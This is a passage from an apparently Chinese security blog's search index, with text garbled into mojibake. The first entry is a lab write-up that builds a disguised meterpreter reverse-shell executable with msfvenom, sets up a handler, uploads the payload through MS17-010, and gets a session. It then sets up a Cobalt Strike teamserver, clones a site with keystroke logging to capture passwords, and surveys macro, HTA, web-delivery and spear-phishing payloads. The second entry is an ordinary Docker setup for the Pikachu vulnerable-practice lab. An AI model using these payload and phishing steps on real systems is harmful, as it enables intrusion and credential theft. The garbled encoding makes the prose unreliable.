GHz) ç½‘ç»œï¼šLANï¼ˆIPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULLï¼‰ å®è·µæ­¥éª¤ MFSæ¶æ„ç¨‹åºåˆ©ç”¨ ä½¿ç”¨msfvenomåˆ¶ä½œæ¶æ„è½¯ä»¶ 1 2 3 4 5 6 7 â”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.223 LPORT=4448 -f exe \u0026gt; Notice.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 354 bytes Final size of exe file: 73802 bytes æ–‡ä»¶å­˜å‚¨äº/root/Notice.exe\nåˆ¶ä½œç›‘å¬ç¨‹åº ç›‘å¬ç¨‹åºçš„åˆ¶ä½œè¿‡ç¨‹ä¸MetasploitæŒä¹…åŒ–åé—¨æ”»å‡»ç›¸åŒï¼š\n1 2 3 4 5 6 7 8 9 10 msf6 \u0026gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set LHOST 10.0.0.223 LHOST =\u0026gt; 10.0.0.223 msf6 exploit(multi/handler) \u0026gt; set LPORT 4448 LPORT =\u0026gt; 4448 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 10.0.0.223:4448 å°†æ¶æ„ç¨‹åºä¼ è¾“ä¸‹è½½åˆ°é¶æœº è¿™é‡Œé€šè¿‡MS17-010æ¼æ´ä¸Metasploitå®ç°æ¶æ„ç¨‹åºçš„upload:\n1 2 3 meterpreter \u0026gt; upload /root/Notice.exe \u0026gt; C:\\\\ [*] Uploading : /root/Notice.exe -\u0026gt; C:\\Notice.exe [*] Completed : /root/Notice.exe -\u0026gt; C:\\Notice.exe ç­‰å¾…é¶æœºæ‰§è¡Œæ¶æ„ç¨‹åº ç›‘å¬å™¨è·å–åˆ°ç”¨æˆ·æƒé™\n1 2 3 4 5 [*] Sending stage (177734 bytes) to 10.0.0.17 [*] Meterpreter session 1 opened (10.0.0.223:4448 -\u0026gt; 10.0.0.17:49864) at 2026-01-03 08:00:49 +0000 meterpreter \u0026gt; getuid Server username: Ankh-PC\\Ankh CSé’“é±¼ç½‘ç«™åˆ¶ä½œ ä¸ºäº†å…‹éš†ç½‘ç«™ï¼Œè™šæ‹Ÿæœºéœ€è¦è”ç½‘ã€‚è¿™é‡Œè®¾ç½®é¶æœºå’ŒKaliçš„ç½‘ç»œè¿æ¥æ¨¡å¼ä¸ºNATæ¨¡å¼ï¼Œä¸¤è€…é€šè¿‡DHCPè‡ªåŠ¨è·å–IPåœ°å€ã€‚æ­¤æ—¶Win7çš„IPåœ°å€ä¸º192.168.10.147/24ï¼›Kaliçš„IPåœ°å€ä¸º192.168.10.135/24ã€‚ä¸¤è€…ä¹‹é—´ä¸å®¿ä¸»æœºç›¸äº’pingé€šå¹¶å¯ä»¥æ­£å¸¸è®¿é—®äº’è”ç½‘\nCobalt Strikeå®‰è£… å°†cobalt_strike_4.5.zipä¸‹è½½è‡³Kaliå¹¶è§£å‹\næ›´æ”¹CSè¯»å†™æƒé™ 1 2 3 4 5 â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Tools/Cobalt Strike] â””â”€# cd coablt_strike_4.5 â”Œâ”€â”€(rootã‰¿kali)-[/home/â€¦/Desktop/Tools/Cobalt Strike/coablt_strike_4.5] â””â”€# chmod 777 * chmod = change modeï¼ˆæ”¹å˜æ¨¡å¼ï¼‰\n777 = æƒé™çš„æ•°å­—è¡¨ç¤ºæ³•\nç¬¬ä¸€ä¸ªæ•°å­—ï¼šæ–‡ä»¶æ‰€æœ‰è€…ï¼ˆownerï¼‰çš„æƒé™\nç¬¬äºŒä¸ªæ•°å­—ï¼šæ‰€å±ç”¨æˆ·ç»„ï¼ˆgroupï¼‰çš„æƒé™\nç¬¬ä¸‰ä¸ªæ•°å­—ï¼šå…¶ä»–ç”¨æˆ·ï¼ˆothersï¼‰çš„æƒé™\næ¯ä¸ªæ•°å­—ç”±ä¸‰ä¸ªæƒé™å€¼ç›¸åŠ ç»„æˆï¼š\n4 = è¯»å–æƒé™ï¼ˆReadï¼‰\n2 = å†™å…¥æƒé™ï¼ˆWriteï¼‰\n1 = æ‰§è¡Œæƒé™ï¼ˆeXecuteï¼‰\n777 çš„å…·ä½“å«ä¹‰ï¼š7 = 4 + 2 + 1ï¼Œå³æ‹¥æœ‰æ‰€æœ‰æƒé™\næ‰€æœ‰è€…ï¼šè¯» + å†™ + æ‰§è¡Œï¼ˆ7ï¼‰\næ‰€å±ç»„ï¼šè¯» + å†™ + æ‰§è¡Œï¼ˆ7ï¼‰\nå…¶ä»–ç”¨æˆ·ï¼šè¯» + å†™ + æ‰§è¡Œï¼ˆ7ï¼‰\nç”ŸæˆCobalt StrikeæœåŠ¡å™¨ç»„ è®¾ç½®æœåŠ¡å™¨IPå’Œå¯†ç ï¼ˆCSæœåŠ¡å™¨åœ¨kaliçš„50050ç«¯å£ç›‘å¬ï¼‰ï¼Œåˆ›å»ºç»„æœåŠ¡å™¨å®ä¾‹\n1 2 3 4 5 6 â”Œâ”€â”€(rootã‰¿kali)-[/home/â€¦/Desktop/Tools/Cobalt Strike/coablt_strike_4.5] â””â”€# ./teamserver 192.168.10.135 admin [*] Will use existing X509 certificate and keystore (for SSL) [+] Team server is up on 0.0.0.0:50050 [*] SHA256 hash of SSL cert is: 7eac4fdf25b2e55d39a7d9fcccc00978b95a7639a78a2c893bd2f6aac3637fb8 [+] Listener: Listener started! æ‰“å¼€Cobalt Strikeå®¢æˆ·ç«¯å¹¶è¿æ¥æœåŠ¡å™¨ç»„ 1 2 â”Œâ”€â”€(rootã‰¿kali)-[/home/â€¦/Desktop/Tools/Cobalt Strike/coablt_strike_4.5] â””â”€# ./cobaltstrike æ‰“å¼€Cobal Strikeï¼Œç”¨åˆšæ‰è®¾ç½®çš„å¯†ç å’ŒIPè¿æ¥åˆ°ç”¨æˆ·ç»„ã€‚Cobalt Strikeæ”¯æŒå¤šè®¾å¤‡åŒæ—¶ç™»å½•æœåŠ¡å™¨ã€‚\nåˆ›å»ºç›‘å¬å™¨ æ‰“å¼€ç›‘å¬å™¨é€‰é¡¹ï¼Œç‚¹å‡»æ·»åŠ \nHTTPåœ°å€ä¸ºKaliåœ°å€ï¼ŒHTTPç«¯å£ä¸ºé’“é±¼ç½‘ç«™ç«¯å£ã€‚æ·»åŠ ç›‘å¬å™¨åï¼ŒCSå°†åœ¨Kaliçš„80ç«¯å£ä¸ŠæŒç»­ç›‘å¬\nç½‘ç«™å…‹éš†ä¸Webæ—¥å¿— â€œå…‹éš†URLâ€ä¸­å¡«å†™è¦ä¼ªè£…çš„ç½‘ç«™ï¼Œè¿™é‡Œåªæ”¯æŒHTTPåè®®ã€‚â€œæœ¬åœ°HOSTâ€ä¸ºæœ¬åœ°Kaliçš„IPåœ°å€ï¼Œä¹Ÿæ˜¯ä¼ªè£…ç½‘å€çš„IPåœ°å€ï¼›â€œæœ¬åœ°ç«¯å£â€ä¸ºä¼ªè£…ç½‘å€çš„è¿è¡Œç«¯å£ï¼Œä¸ç›‘å¬å™¨ç›¸ä¸€è‡´ï¼›å¼€å¯é”®ç›˜è®°å½•\næœ€ç»ˆè®¿é—®åœ°å€ä¸ºhttp://192.168.10.135:80/ã€‚ç”±äºç½‘ç»œé€‚é…å™¨ä¸ºNATæ¨¡å¼ã€‚å› æ­¤æ‰€æœ‰NATè¿æ¥çš„è™šæ‹Ÿæœºä»¥åŠå®¿ä¸»æœºéƒ½å¯è®¿é—®è¯¥é¡µé¢ã€‚\næ‰“å¼€Webæ—¥å¿—ã€‚\né¶æœºè®¿é—®é’“é±¼ç½‘ç«™ åœ¨Win7çš„æµè§ˆå™¨ä¸­è®¿é—®ä¼ªè£…ç½‘å€ï¼Œè¾“å…¥Kali\né”®ç›˜è®°å½• Webæ—¥å¿—ä¸­æ‰“å°Win7çš„é”®ç›˜è¾“å…¥ã€‚è¯¥æ‰‹æ®µç”¨äºè·å–ç”¨æˆ·çš„å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ã€‚\nCSèœå•åŠŸèƒ½æ¦‚è§ˆ è§†å›¾ æ­¤èœå•ä¸»è¦ç”¨äºç®¡ç†å’ŒæŸ¥çœ‹åœ¨åæ¸—é€é˜¶æ®µï¼ˆPost-Exploitationï¼‰æ”¶é›†åˆ°çš„å„ç±»æ•°æ®ã€‚\nåº”ç”¨ç¨‹åº (Applications)ï¼šæ˜¾ç¤ºç”±â€œç³»ç»Ÿåˆ†æå™¨ï¼ˆSystem Profilerï¼‰â€æ”¶é›†åˆ°çš„ç›®æ ‡æµè§ˆå™¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬æµè§ˆå™¨ç‰ˆæœ¬ã€Flashç‰ˆæœ¬ã€Javaç‰ˆæœ¬ç­‰ï¼Œå¸®åŠ©ä½ åˆ¤æ–­ç›®æ ‡æœ‰å“ªäº›å¯è¢«åˆ©ç”¨çš„å®¢æˆ·ç«¯æ¼æ´ã€‚ å¯†ç å‡­è¯ (Credentials)ï¼šè¿™æ˜¯ä¸€ä¸ªä¸­å¤®æ•°æ®åº“ï¼Œå­˜å‚¨æ‰€æœ‰é€šè¿‡ hashdumpã€mimikatz æˆ–é’“é±¼æ”»å‡»è·å–åˆ°çš„ç”¨æˆ·åã€å¯†ç ã€NTLM å“ˆå¸ŒåŠä»¤ç‰Œã€‚ ä¸‹è½½åˆ—è¡¨ (Downloads)ï¼šè®°å½•æ‰€æœ‰ä»å—æ§ä¸»æœºä¸‹è½½åˆ° Team Server çš„æ–‡ä»¶ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œå³é”®å°†æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ°ã€‚ äº‹ä»¶æ—¥å¿— (Event Log)ï¼šæ•´ä¸ªå›¢é˜Ÿçš„â€œèŠå¤©å®¤â€å’Œå®¡è®¡ä¸­å¿ƒã€‚è®°å½•äº†è°ä¸Šçº¿äº†ã€æ‰§è¡Œäº†ä»€ä¹ˆå…³é”®å‘½ä»¤ï¼Œä»¥åŠå›¢é˜Ÿæˆå‘˜ä¹‹é—´çš„å³æ—¶æ¶ˆæ¯æ²Ÿé€šã€‚ é”®ç›˜è®°å½• (Keystrokes)ï¼šé›†ä¸­å±•ç¤ºé€šè¿‡ keylogger å‘½ä»¤æŠ“å–åˆ°çš„æ‰€æœ‰ç›®æ ‡å‡»é”®è®°å½•ã€‚ ä»£ç†è½¬å‘ (Proxy Pivots)ï¼šç®¡ç† SOCKS ä»£ç†å’Œåå‘ç«¯å£è½¬å‘ã€‚å½“ä½ æƒ³åˆ©ç”¨å—æ§ä¸»æœºä½œä¸ºè·³æ¿æ”»å‡»å†…ç½‘å…¶ä»–æœºå™¨æ—¶ï¼Œåœ¨è¿™é‡Œé…ç½®ä»£ç†ä¿¡æ¯ã€‚ å±å¹•æˆªå›¾ (Screenshots)ï¼šå±•ç¤ºæ‰€æœ‰ä» Beacon å‘å›çš„å±å¹•æˆªå›¾ã€‚æ”¯æŒç¼©ç•¥å›¾é¢„è§ˆï¼Œæ–¹ä¾¿å¿«é€ŸæŸ¥çœ‹ç›®æ ‡å½“å‰çš„æ“ä½œç•Œé¢ã€‚ è„šæœ¬æ§åˆ¶å° (Script Console)ï¼šç”¨äºåŠ è½½å’Œè°ƒè¯• Aggressor Scriptï¼ˆCS çš„è‡ªåŠ¨åŒ–è„šæœ¬è¯­è¨€ï¼‰ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°è„šæœ¬è¿è¡Œçš„è¾“å‡ºæˆ–é”™è¯¯ä¿¡æ¯ã€‚ ç›®æ ‡åˆ—è¡¨ (Targets)ï¼šåˆ—å‡ºå½“å‰ç½‘ç»œä¸­æ‰€æœ‰å·²çŸ¥çš„è®¡ç®—æœºåŠå…¶å…ƒæ•°æ®ï¼ˆIPã€ç³»ç»Ÿç‰ˆæœ¬ç­‰ï¼‰ã€‚ä½ å¯ä»¥é€šè¿‡æ‰«ææˆ–å¯¼å…¥æ–¹å¼å¢åŠ ç›®æ ‡ã€‚ Webæ—¥å¿— (Web Log)ï¼šè®°å½• CS å†…ç½® Web æœåŠ¡å™¨çš„æ‰€æœ‰è®¿é—®è¯·æ±‚ã€‚åŒ…æ‹¬è°è®¿é—®äº†ä½ çš„é’“é±¼é¡µé¢ã€ä¸‹è½½äº†ä»€ä¹ˆæ–‡ä»¶ã€‚ æ”»å‡» è¯¥èœå•æ˜¯ CS çš„æ ¸å¿ƒåŠŸèƒ½åŒºï¼Œåˆ†ä¸ºè½½è·ç”Ÿæˆã€Web æ¸—é€å’Œé‚®ä»¶é’“é±¼ä¸‰å¤§ç±»ã€‚\nç”Ÿæˆåé—¨ (Packages)\nç”¨äºåˆ›å»ºå„ç§å½¢å¼çš„åˆå§‹æ§åˆ¶è½½è·ï¼ˆPayloadï¼‰ã€‚\nHTAæ–‡æ¡£ï¼šç”Ÿæˆ .hta åç¼€çš„ HTML åº”ç”¨ç¨‹åºã€‚å®ƒå¸¸é€šè¿‡æµè§ˆå™¨ä¸‹è½½æ‰§è¡Œï¼Œåˆ©ç”¨ VBScript æˆ– JScript åœ¨ç³»ç»Ÿåº•å±‚è¿è¡Œ Beaconã€‚\nOfficeå®ï¼šç”Ÿæˆä¸€æ®µ VBA ä»£ç ï¼Œä½ å¯ä»¥å°†å…¶åµŒå…¥ Word æˆ– Excel æ–‡æ¡£ä¸­ã€‚å½“å—å®³è€…ç‚¹å‡»â€œå¯ç”¨å®â€æ—¶ï¼Œå°±ä¼šè§¦å‘ä¸Šçº¿ã€‚\nPayloadç”Ÿæˆå™¨ï¼šæœ€åŸºç¡€çš„å·¥å…·ã€‚å®ƒå¯ä»¥å°† Beacon ç”Ÿæˆå„ç§æ ¼å¼çš„åŸå§‹æ•°æ®ï¼ˆRaw Shellcodeï¼‰ï¼Œæˆ–è€…ç”Ÿæˆ Cã€C#ã€Javaã€Python ç­‰è¯­è¨€çš„æºä»£ç ä¾›ä½ äºŒæ¬¡å¼€å‘ã€‚\nWindowså¯æ‰§è¡Œç¨‹åºï¼šç”Ÿæˆä¸€ä¸ª Stagedï¼ˆåˆ†é˜¶æ®µï¼‰çš„ EXE æˆ– DLL æ–‡ä»¶ã€‚è¿™ç§åé—¨ä½“ç§¯å°ï¼Œè¿è¡Œæ—¶ä¼šå…ˆè¿æ¥æœåŠ¡å™¨ä¸‹è½½å®Œæ•´çš„ Beaconã€‚\nWindowså¯æ‰§è¡Œç¨‹åº(Stageless)ï¼šç”Ÿæˆä¸€ä¸ª Stagelessï¼ˆä¸åˆ†é˜¶æ®µï¼‰çš„åé—¨ã€‚å®ƒåŒ…å«å®Œæ•´çš„ Beacon åŠŸèƒ½ï¼Œè™½ç„¶ä½“ç§¯è¾ƒå¤§ï¼Œä½†åœ¨å¤æ‚çš„ç½‘ç»œç¯å¢ƒä¸‹æ›´ç¨³å®šä¸”æ›´éš¾è¢«æµé‡ç›‘æ§å‘ç°ã€‚\nWebé’“é±¼ (Web Drive-by)\nåˆ©ç”¨ CS å†…ç½®çš„ Web æœåŠ¡å™¨è¿›è¡Œè‡ªåŠ¨åŒ– Web æ”»å‡»ã€‚\nç«™ç‚¹ç®¡ç† (Manage)ï¼šæŸ¥çœ‹å¹¶ç®¡ç†å½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„ Web æœåŠ¡ï¼ˆå…‹éš†çš„é¡µé¢ã€æ‰˜ç®¡çš„æ–‡ä»¶ç­‰ï¼‰ã€‚ ç½‘ç«™å…‹éš† (Clone Site)ï¼šè¾“å…¥ä¸€ä¸ªç½‘å€ï¼ˆå¦‚å…¬å¸å†…ç½‘ç™»å½•é¡µï¼‰ï¼ŒCS ä¼šå…‹éš†è¯¥é¡µé¢ã€‚ä½ è¿˜å¯ä»¥é…ç½®å®ƒæŠ“å–ç”¨æˆ·è¾“å…¥çš„è¡¨å•æ•°æ®ï¼ˆå¦‚è´¦å·å¯†ç ï¼‰ã€‚ æ–‡ä»¶æ‰˜ç®¡ (Host File)ï¼šç®€å•çš„ Web æœåŠ¡å™¨åŠŸèƒ½ï¼Œç”¨äºæŠŠä½ çš„æœ¨é©¬æˆ–å·¥å…·æŒ‚åœ¨ç½‘ä¸Šä¾›ç›®æ ‡ä¸‹è½½ã€‚ WebæŠ•é€’ (Web Delivery)ï¼šæä¾›ä¸€ç§â€œä¸€é”®ä¸Šçº¿â€çš„æ–¹æ¡ˆã€‚å®ƒç”Ÿæˆä¸€ä¸ª PowerShellã€Python æˆ– Bitsadmin å‘½ä»¤ï¼Œåªè¦åœ¨ç›®æ ‡æœºå™¨è¿è¡Œè¿™è¡Œå‘½ä»¤ï¼Œå³å¯è¿œç¨‹ä¸‹è½½æ‰§è¡Œ Beaconã€‚ ç­¾å/æ™ºèƒ½ Applet æ”»å‡»ï¼šåˆ©ç”¨æ—§ç‰ˆæœ¬ Java çš„æ¼æ´æˆ–è¯±å¯¼ç”¨æˆ·ç‚¹å‡»è¿è¡Œ Java æ’ä»¶ã€‚æ³¨æ„ï¼šç”±äºç°ä»£æµè§ˆå™¨å·²ä¸å†æ”¯æŒ Java æ’ä»¶ï¼Œè¿™äº›åŠŸèƒ½åœ¨å®æˆ˜ä¸­å·²åŸºæœ¬è¿‡æ—¶ã€‚ ä¿¡æ¯æ”¶é›† (System Profiler)ï¼šç”Ÿæˆä¸€ä¸ªéšè—çš„æ¢æµ‹é“¾æ¥ã€‚å½“ç”¨æˆ·ç‚¹å‡»æ—¶ï¼Œå®ƒä¼šé™é»˜æ”¶é›†è¯¥ç”¨æˆ·çš„ç³»ç»Ÿç¯å¢ƒä¿¡æ¯ï¼Œå¹¶å­˜å…¥â€œè§†å›¾ -\u0026gt; åº”ç”¨ç¨‹åºâ€ä¸­ã€‚ é‚®ä»¶é’“é±¼ (Spear Phish)\nè¿™æ˜¯ä¸€ä¸ªä¸“é—¨çš„é’“é±¼é‚®ä»¶å‘é€å¹³å°ã€‚\nå¯¼å…¥é‚®ä»¶æ¨¡æ¿å’Œç›®æ ‡é‚®ç®±åˆ—è¡¨ã€‚ é…ç½® SMTP å‘ä¿¡æœåŠ¡å™¨ã€‚ å°†ä¸Šè¿°â€œç”Ÿæˆåé—¨â€æˆ–â€œWebé’“é±¼â€ç”Ÿæˆçš„é“¾æ¥/é™„ä»¶è‡ªåŠ¨æ³¨å…¥é‚®ä»¶å¹¶ç¾¤å‘ã€‚ ","date":"2026-01-03T13:48:09+08:00","image":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/CS_hu_1e29a32e1f5c7432.png","permalink":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/","title":"ã€æ”»é˜²å®è·µã€‘MSFæ¶æ„ç¨‹åºåˆ©ç”¨ä¸CSé’“é±¼ç½‘ç«™åˆ¶ä½œ"},{"content":"é¶åœºæ­å»º ç›®å½• é¶åœºç¯å¢ƒ Pikachu-Docker å®‰è£…Docker é…ç½®Dockeré•œåƒ æ‹‰å–Pikachué•œåƒ è¿è¡Œå®¹å™¨ æŒä¹…åŒ–è¿è¡Œ é¶åœºç¯å¢ƒ Ubuntu 24.01 64bit\nPikachu-Docker å®‰è£…Docker 1 2 3 4 5 sudo apt update # æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨ sudo install docker.io docker-compose -y # å®‰è£…Dockerå’ŒDocker Compose sudo systemctl start docker # å¯åŠ¨DockeræœåŠ¡ sudo systemctl enable docker # è®¾ç½®Dockerå¼€æœºè‡ªå¯åŠ¨ docker --version # æŸ¥çœ‹Dockerç‰ˆæœ¬ä»¥éªŒè¯å®‰è£… é…ç½®Dockeré•œåƒ ç¼–è¾‘dockeré…ç½®æ–‡ä»¶ 1 sudo nano /etc/docker/daemon.json # ç¼–è¾‘Docekrså®ˆæŠ¤è¿›ç¨‹é…ç½® æ·»åŠ é•œåƒåŠ é€Ÿåœ°å€ 1 2 3 4 5 6 7 { \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://docker.1ms.run\u0026#34;, \u0026#34;https://docker-0.unsee.tech\u0026#34;, \u0026#34;https://docker.m.daocloud.io\u0026#34; ] } // å†™å…¥å›½å†…é•œåƒåŠ é€Ÿå™¨ ä¿å­˜å¹¶é‡å¯DockeræœåŠ¡ 1 2 sudo systemctl daemon-reload # é‡æ–°åŠ è½½ systemd å®ˆæŠ¤è¿›ç¨‹é…ç½® sudo systemctl restart docker # é‡å¯ Docker æœåŠ¡ä½¿é…ç½®ç”Ÿæ•ˆ æ‹‰å–Pikachué•œåƒ 1 sudo docker pull area39/pikachu è¿è¡Œå®¹å™¨ 1 sudo docker run -d --name pikachu -p 8000:80 area39/pikachu æŒä¹…åŒ–è¿è¡Œ 1 2 sudo docker stop pikachu sudo docker rm pikachu # åœæ­¢å¹¶åˆ é™¤å®¹å™¨ 1 2 # åˆ›å»ºå‘½åæ•°æ®å· sudo docker volume create pikachu_data å¯åŠ¨è„šæœ¬ï¼ˆpikachu-start.bashï¼‰: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 #!/bin/bash # pikachu-manager.sh - Pikachu Docker å®¹å™¨ç®¡ç†è„šæœ¬ CONTAINER_NAME=\u0026#34;pikachu\u0026#34; IMAGE_NAME=\u0026#34;area39/pikachu\u0026#34; PORT=\u0026#34;8001:80\u0026#34; VOLUME_NAME=\u0026#34;pikachu_data\u0026#34; VOLUME_PATH=\u0026#34;/app/data\u0026#34; # é¢œè‰²å®šä¹‰ RED=\u0026#39;\\033[0;31m\u0026#39; GREEN=\u0026#39;\\033[0;32m\u0026#39; YELLOW=\u0026#39;\\033[1;33m\u0026#39; BLUE=\u0026#39;\\033[0;34m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; # No Color show_usage() { echo -e \u0026#34;${BLUE}Pikachu å®¹å™¨ç®¡ç†è„šæœ¬${NC}\u0026#34; echo \u0026#34;ç”¨æ³•: $0 [å‘½ä»¤]\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;å‘½ä»¤:\u0026#34; echo \u0026#34; start å¯åŠ¨å®¹å™¨\u0026#34; echo \u0026#34; stop åœæ­¢å®¹å™¨\u0026#34; echo \u0026#34; restart é‡å¯å®¹å™¨\u0026#34; echo \u0026#34; status æŸ¥çœ‹å®¹å™¨çŠ¶æ€\u0026#34; echo \u0026#34; logs æŸ¥çœ‹å®¹å™¨æ—¥å¿—\u0026#34; echo \u0026#34; remove åˆ é™¤å®¹å™¨ï¼ˆä¿ç•™æ•°æ®å·ï¼‰\u0026#34; echo \u0026#34; purge å½»åº•åˆ é™¤ï¼ˆå®¹å™¨+æ•°æ®å·ï¼‰\u0026#34; echo \u0026#34; backup å¤‡ä»½æ•°æ®å·\u0026#34; echo \u0026#34; shell è¿›å…¥å®¹å™¨shell\u0026#34; echo \u0026#34;\u0026#34; } check_docker() { if ! command -v docker \u0026amp;\u0026gt; /dev/null; then echo -e \u0026#34;${RED}é”™è¯¯: Docker æœªå®‰è£…${NC}\u0026#34; exit 1 fi if ! sudo docker info \u0026amp;\u0026gt; /dev/null; then echo -e \u0026#34;${RED}é”™è¯¯: Docker æœåŠ¡æœªè¿è¡Œæˆ–æ— æƒé™${NC}\u0026#34; echo \u0026#34;è¯·ç¡®ä¿DockeræœåŠ¡æ­£åœ¨è¿è¡Œï¼Œæˆ–ä½¿ç”¨sudoæƒé™\u0026#34; exit 1 fi } start_container() { check_docker echo -e \u0026#34;${BLUE}æ­£åœ¨å¯åŠ¨ Pikachu å®¹å™¨...${NC}\u0026#34; # æ£€æŸ¥é•œåƒæ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™æ‹‰å– if ! sudo docker images | grep -q \u0026#34;$(echo $IMAGE_NAME | cut -d\u0026#39;:\u0026#39; -f1)\u0026#34;; then echo -e \u0026#34;${YELLOW}æ­£åœ¨æ‹‰å–é•œåƒ...${NC}\u0026#34; sudo docker pull ${IMAGE_NAME} fi # æ£€æŸ¥æ˜¯å¦å·²å­˜åœ¨åŒåå®¹å™¨ if sudo docker ps -a --format \u0026#34;{{.Names}}\u0026#34; | grep -q \u0026#34;^${CONTAINER_NAME}$\u0026#34;; then if sudo docker ps --format \u0026#34;{{.Names}}\u0026#34; | grep -q \u0026#34;^${CONTAINER_NAME}$\u0026#34;; then echo -e \u0026#34;${YELLOW}å®¹å™¨å·²åœ¨è¿è¡Œä¸­${NC}\u0026#34; return else echo -e \u0026#34;${YELLOW}å‘ç°åœæ­¢çš„å®¹å™¨ï¼Œæ­£åœ¨å¯åŠ¨...${NC}\u0026#34; sudo docker start ${CONTAINER_NAME} fi else # åˆ›å»ºæ•°æ®å·ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰ if ! sudo docker volume ls | grep -q ${VOLUME_NAME}; then echo -e \u0026#34;${YELLOW}åˆ›å»ºæ•°æ®å·: ${VOLUME_NAME}${NC}\u0026#34; sudo docker volume create ${VOLUME_NAME} fi # è¿è¡Œæ–°å®¹å™¨ sudo docker run -d \\ --name ${CONTAINER_NAME} \\ --restart unless-stopped \\ -p ${PORT} \\ -v ${VOLUME_NAME}:${VOLUME_PATH} \\ ${IMAGE_NAME} fi if [ $? -eq 0 ]; then echo -e \u0026#34;${GREEN}âœ“ Pikachu å®¹å™¨å¯åŠ¨æˆåŠŸï¼${NC}\u0026#34; echo -e \u0026#34;${BLUE}å®¹å™¨ä¿¡æ¯:${NC}\u0026#34; echo \u0026#34; åç§°: ${CONTAINER_NAME}\u0026#34; echo \u0026#34; é•œåƒ: ${IMAGE_NAME}\u0026#34; echo \u0026#34; ç«¯å£: ${PORT}\u0026#34; echo \u0026#34; æ•°æ®å·: ${VOLUME_NAME}\u0026#34; echo -e \u0026#34;${BLUE}è®¿é—®åœ°å€:${NC} http://localhost:8001\u0026#34; else echo -e \u0026#34;${RED}âœ— å®¹å™¨å¯åŠ¨å¤±è´¥${NC}\u0026#34; exit 1 fi } stop_container() { check_docker echo -e \u0026#34;${YELLOW}æ­£åœ¨åœæ­¢å®¹å™¨...${NC}\u0026#34; sudo docker stop ${CONTAINER_NAME} if [ $? -eq 0 ]; then echo -e \u0026#34;${GREEN}âœ“ å®¹å™¨å·²åœæ­¢${NC}\u0026#34; else echo -e \u0026#34;${RED}âœ— åœæ­¢å®¹å™¨å¤±è´¥${NC}\u0026#34; fi } restart_container() { check_docker echo -e \u0026#34;${YELLOW}æ­£åœ¨é‡å¯å®¹å™¨...${NC}\u0026#34; sudo docker restart ${CONTAINER_NAME} if [ $? -eq 0 ]; then echo -e \u0026#34;${GREEN}âœ“ å®¹å™¨å·²é‡å¯${NC}\u0026#34; else echo -e \u0026#34;${RED}âœ— é‡å¯å®¹å™¨å¤±è´¥${NC}\u0026#34; fi } show_status() { check_docker echo -e \u0026#34;${BLUE}å®¹å™¨çŠ¶æ€:${NC}\u0026#34; sudo docker ps -a --filter \u0026#34;name=${CONTAINER_NAME}\u0026#34; --format \u0026#34;table {{.Names}}\\t{{.Status}}\\t{{.Ports}}\\t{{.Image}}\u0026#34; echo -e \u0026#34;\\n${BLUE}æ•°æ®å·ä¿¡æ¯:${NC}\u0026#34; sudo docker volume ls --filter \u0026#34;name=${VOLUME_NAME}\u0026#34; echo -e \u0026#34;\\n${BLUE}èµ„æºä½¿ç”¨æƒ…å†µ:${NC}\u0026#34; sudo docker stats ${CONTAINER_NAME} --no-stream --format \u0026#34;table {{.Name}}\\t{{.CPUPerc}}\\t{{.MemUsage}}\\t{{.NetIO}}\\t{{.BlockIO}}\u0026#34; } show_logs() { check_docker echo -e \u0026#34;${BLUE}å®¹å™¨æ—¥å¿— (æœ€å50è¡Œ):${NC}\u0026#34; sudo docker logs --tail 50 ${CONTAINER_NAME} } remove_container() { check_docker echo -e \u0026#34;${YELLOW}æ­£åœ¨åˆ é™¤å®¹å™¨...${NC}\u0026#34; sudo docker rm ${CONTAINER_NAME} if [ $? -eq 0 ]; then echo -e \u0026#34;${GREEN}âœ“ 